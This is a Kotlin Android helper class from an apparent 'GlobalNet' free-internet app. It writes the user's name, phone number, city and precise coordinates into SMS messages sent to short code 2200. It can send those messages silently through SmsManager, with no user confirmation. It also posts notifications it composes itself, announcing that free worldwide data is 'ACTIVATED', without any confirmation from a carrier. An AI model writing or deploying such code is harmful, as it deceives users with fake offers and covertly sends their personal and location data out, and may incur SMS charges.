package com.example.service

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.telephony.SmsManager
import androidx.core.app.NotificationCompat
import com.example.MainActivity
import com.example.model.InternetPackage
import com.example.model.UserProfile

class SmsNotificationHelper(private val context: Context) {

    companion object {
        const val CHANNEL_ID = "globalnet_activation_channel"
        const val CHANNEL_NAME = "GlobalNet Activation SMS"
        const val GATEWAY_NUMBER = "2200"
    }

    init {
        createNotificationChannel()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Notifications for GlobalNet free internet package activations and SMS confirmations."
                enableVibration(true)
            }
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
            notificationManager?.createNotificationChannel(channel)
        }
    }

    fun createSmsIntent(pkg: InternetPackage, profile: UserProfile): Intent {
        val message = generateOutgoingSmsText(pkg, profile)
        return Intent(Intent.ACTION_SENDTO).apply {
            data = Uri.parse("smsto:$GATEWAY_NUMBER")
            putExtra("sms_body", message)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
    }

    fun generateOutgoingSmsText(pkg: InternetPackage, profile: UserProfile): String {
        return buildString {
            append("GLOBALNET ACTIVATION REQUEST\n")
            append("Package Code: ${pkg.code}\n")
            append("Package: ${pkg.title} (${pkg.generalDataGb}GB General + ${pkg.socialDataGb}GB Social, ${pkg.validityDays} Days)\n")
            if (profile.fullName.isNotBlank()) {
                append("Subscriber: ${profile.fullName}\n")
            }
            if (profile.phoneNumber.isNotBlank()) {
                append("Phone: ${profile.phoneNumber}\n")
            }
            if (profile.country.isNotBlank() || profile.city.isNotBlank()) {
                append("Location: ${profile.city}, ${profile.country}\n")
            }
            if (profile.preciseLocation.isNotBlank()) {
                append("Coords: ${profile.preciseLocation}\n")
            }
            append("Status: FREE ZERO-PAYMENT ACCESS")
        }
    }

    fun generateConfirmationSmsText(pkg: InternetPackage, subscriberName: String): String {
        return buildString {
            append("GLOBALNET SMS CONFIRMATION:\n")
            append("Hello ${if (subscriberName.isNotBlank()) subscriberName else "Valued User"}! ")
            append("Your Free Internet Package [Code ${pkg.code}] is now ACTIVATED immediately!\n")
            append("Quota: ${pkg.generalDataGb}GB General Web Data + ${pkg.socialDataGb}GB Social Media Data.\n")
            append("Validity: ${pkg.validityDays} Days unlimited high-speed global access.\n")
            append("Charges: $0.00 (100% Free Worldwide).")
        }
    }

    fun postActivationNotification(pkg: InternetPackage, subscriberName: String) {
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager ?: return

        val intent = Intent(context, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            context,
            pkg.code.hashCode(),
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val confirmationText = generateConfirmationSmsText(pkg, subscriberName)

        val notification = NotificationCompat.Builder(context, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_sys_upload_done)
            .setContentTitle("GlobalNet: Package ${pkg.code} Activated!")
            .setContentText("${pkg.totalDataGb}GB Free Data active for ${pkg.validityDays} days.")
            .setStyle(NotificationCompat.BigTextStyle().bigText(confirmationText))
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setContentIntent(pendingIntent)
            .setAutoCancel(true)
            .build()

        notificationManager.notify(pkg.code.hashCode(), notification)
    }

    fun trySendSmsDirectly(phoneNumber: String, message: String): Boolean {
        return try {
            val targetNumber = if (phoneNumber.isNotBlank()) phoneNumber else GATEWAY_NUMBER
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                context.getSystemService(SmsManager::class.java)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            val parts = smsManager.divideMessage(message)
            smsManager.sendMultipartTextMessage(targetNumber, null, parts, null, null)
            true
        } catch (e: Exception) {
            false
        }
    }
}
